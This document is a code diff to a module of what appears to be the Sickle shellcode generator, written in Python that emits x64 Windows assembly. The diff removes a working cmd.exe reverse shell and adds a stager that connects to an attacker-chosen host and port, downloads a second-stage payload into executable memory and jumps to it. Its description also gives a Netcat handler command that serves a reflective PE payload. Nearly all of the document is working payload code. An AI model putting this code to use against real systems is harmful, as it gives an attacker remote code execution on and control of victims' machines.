@@ -1,7 +1,9 @@
 import sys
+import math
 import ctypes
 import struct
 
+from sickle.common.lib.generic import extract
 from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
@@ -12,9 +14,7 @@ from sickle.common.headers.windows import (
     winnt,
     ntdef,
     ws2def,
-    winternl,
-    winsock2,
-    processthreadsapi
+    winternl
 )
 
 class Shellcode():
@@ -23,28 +23,30 @@ class Shellcode():
 
     platform = "windows"
 
-    name = f"Windows ({arch}) CMD Reverse Shell"
+    name = f"Windows ({arch}) VirtualAlloc Shellcode Loader"
 
-    module = f"{platform}/{arch}/shell_reverse_tcp"
+    module = f"{platform}/{arch}/virtualalloc_exec_tcp"
 
     example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
     ring = 3
 
-    author = ["Morten Schenk",
-              "Alexandru Uifalvi",
-              "Matteo Memelli",
-              "wetw0rk"]
+    author = ["wetw0rk"]
 
-    tested_platforms = ["Windows 10 (10.0.17763 N/A Build 17763)",
-                        "Windows 11 (10.0.26100 N/A Build 26100)"]
+    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]
 
-    summary = ("Reverse Shell via TCP over IPv4 that provides an interactive cmd.exe "
-               "session")
+    summary = ("A lightweight stager that connects to a handler via TCP over IPv4 to receive and execute shellcode")
 
-    description = ("A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe"
-    " session. Since this payload is not staged, there is no need for anything"
-    " more than a Netcat listener.")
+    description = ("This shellcode stub connects to a remote server handler over TCP, downloads a second-stage"
+                   " payload, and executes it.\n\n"
+
+                   "Your handler can be as simple as combining Sickle and Netcat:\n\n"
+
+                   f"    {sys.argv[0]} -p windows/x64/reflective_pe EXE=/path/doom.exe -f raw | nc -lvp 8080\n\n"
+
+                   "Upon execution of the first stage, you should get a connection from the target on your"
+                   " handler. If using Netcat, hit [CTRL]+[C]. Upon doing so, your shellcode should execute"
+                   " in memory.")
 
     arguments = {}
     arguments["LHOST"] = {}
@@ -62,27 +64,28 @@ class Shellcode():
         self.dependencies = {
             "Kernel32.dll": [
                 "LoadLibraryA",
-                "CreateProcessA",
-                "TerminateProcess",
+                "VirtualAlloc",
             ],
-            "Ws2_32.dll": [
+            "Ws2_32.dll" : [
                 "WSAStartup",
-                "WSASocketA",
+                "socket",
                 "connect",
+                "recv",
             ],
         }
 
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
-            "wsaData"              : 0x00,
-            "name"                 : 0x00,
-            "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
-            "lpCommandLine"        : len("cmd\x00\x00\x00\x00\x00"),
-            "lpProcessInformation" : 0x00,
-       })
+            "wsaData"                       : 0x00,
+            "sockaddr_name"                 : 0x00,
+            "sockfd"                        : 0x00,
+            "pResponse"                     : 0x00,
+            "lpvShellcode"                  : 0x00,
+        })
 
         self.stack_space = builder.calc_stack_space(sc_args)
         self.storage_offsets = builder.gen_offsets(sc_args)
+        self.sock_buffer_size = 0x1000 * 1100
 
         return
 
@@ -92,8 +95,6 @@ class Shellcode():
 
         stub = f"""
 getKernel32:
-    push rbp
-    mov rbp, rsp
     mov dl, 0x4b
 getPEB:
     mov rcx, 0x60
@@ -111,7 +112,6 @@ search:
     cmp [rsi], dl
     jne search
 found:
-    leave
     ret
         """
 
@@ -185,7 +185,7 @@ error:
             write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
+            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
             src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
@@ -244,7 +244,6 @@ get_{imports[func]}:
         else:
             lport = int(argv_dict["LPORT"])
 
-
         sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
         sin_port = struct.pack('<H', lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
@@ -254,126 +253,85 @@ _start:
     push rbp
     mov rbp, rsp
     sub rsp, {self.stack_space}
-    and rsp, 0xfffffffffffffff0
 
     call getKernel32
     mov rdi, rax
-"""
+        """
 
         shellcode += self.resolve_functions()
 
         shellcode += f"""
-; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
-;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
 call_WSAStartup:
     mov rcx, 0x202
     lea rdx, [rbp - {self.storage_offsets['wsaData']}]
     mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
-; RAX => WSASocketA([in] int                 af,              // RCX      => 0x02 (AF_INET)
-;                   [in] int                 type,            // RDX      => 0x01 (SOCK_STREAM)
-;                   [in] int                 protocol,        // R8       => 0x08 (IPPROTO_TCP)
-;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
-;                   [in] GROUP               g,               // RSP+0x20 => NULL
-;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
-call_WSASocketA:
-    mov ecx, {ws2def.AF_INET}
-    mov edx, {winsock2.SOCK_STREAM}
-    mov r8, {ws2def.IPPROTO_TCP}
-    xor r9, r9
-    mov [rsp+0x20], r9
-    mov [rsp+0x28], r9
-    mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
+call_socket:
+    mov rcx, {ws2def.AF_INET}
+    xor rdx, rdx
+    inc dl
+    xor r8, r8
+    mov rax, [rbp - {self.storage_offsets['socket']}]
     call rax
+    mov [rbp - {self.storage_offsets['sockfd']}], rax
 
-    mov rsi, rax // save the socket file descriptor (sockfd)
-
-; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
-;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
-;                [in] int namelen);         // R8  => 0x10
 call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
-    lea rdx, [rbp - {self.storage_offsets['name']}]
+    lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
     mov r9, {sin_addr}{sin_port}{sin_family}
     mov [rdx], r9
     xor r9, r9
-    mov [rdx + 0x8], r9
+    mov [rdx + 0x08], r9
     mov rax, [rbp - {self.storage_offsets['connect']}]
     call rax
 
-; [RBX] => typedef struct _STARTUPINFOA {{ }}
-memset_STARTUPINFOA:
-    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]
-    mov rbx, rdi
-    xor eax, eax
-    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}
-    rep stosd
+    xor rdx, rdx
+    mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
+    mov [rbp - {self.storage_offsets['pResponse']}], rdx
 
-init_STARTUPINFOA:
-    mov eax, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
-    mov [rbx], eax
-
-    mov eax, {processthreadsapi.STARTF_USESTDHANDLES}
-    mov [rbx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
-    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], rsi
-    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], rsi
-    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], rsi
-
-; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
-;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
-;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
-;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => NULL
-;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
-;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
-;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
-;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo
-call_CreateProccessA:
-    xor ecx, ecx
-    mov rdx, rbp
-    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]
-    xor rax, rax
-    mov eax, 0x646d63
-    mov [rdx], rax
-    xor r8, r8
-    xor r9, r9
-    xor eax, eax
-    inc eax
-    mov [rsp + 0x20], rax
-    dec eax
-    mov [rsp + 0x28], rax
-    mov [rsp + 0x30], rax
-    mov [rsp + 0x38], rax
-    mov [rsp + 0x40], rbx
-    lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
-    mov [rsp + 0x48], rbx
-    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
+call_VirtualAlloc:
+    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
+    mov rdx, {self.sock_buffer_size}
+    mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
+    mov r9, {winnt.PAGE_EXECUTE_READWRITE}
+    mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
     call rax
 
-; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
-;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
-call_TerminateProcess:
-	xor rcx, rcx
-	dec rcx
-	xor rdx, rdx
-	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
-	call rax
+    mov [rbp - {self.storage_offsets['lpvShellcode']}] , rax
+    mov [rbp - {self.storage_offsets['pResponse']}], rax
 
-fin:
-    leave
-    ret
-"""
+call_recv:
+    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
+    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
+    mov r8, 0x5000
+    xor r9, r9
+    mov rax, [rbp - {self.storage_offsets['recv']}]
+    call rax
+
+check_complete:
+    test eax, eax
+    jle download_complete
+
+inc_ptr:
+    mov r8, [rbp - {self.storage_offsets['pResponse']}]
+    add r8, rax
+    mov [rbp - {self.storage_offsets['pResponse']}], r8
+    jmp call_recv
+
+download_complete:
+    jmp [rbp - {self.storage_offsets['lpvShellcode']}]
+        """
 
         shellcode += self.get_kernel32()
+
         shellcode += self.lookup_function()
 
         return shellcode
 
     def get_shellcode(self):
-        """Generates Windows (x64) generic reverse shell
+        """Generates shellcode
         """
 
         generator = Assembler(Shellcode.arch)
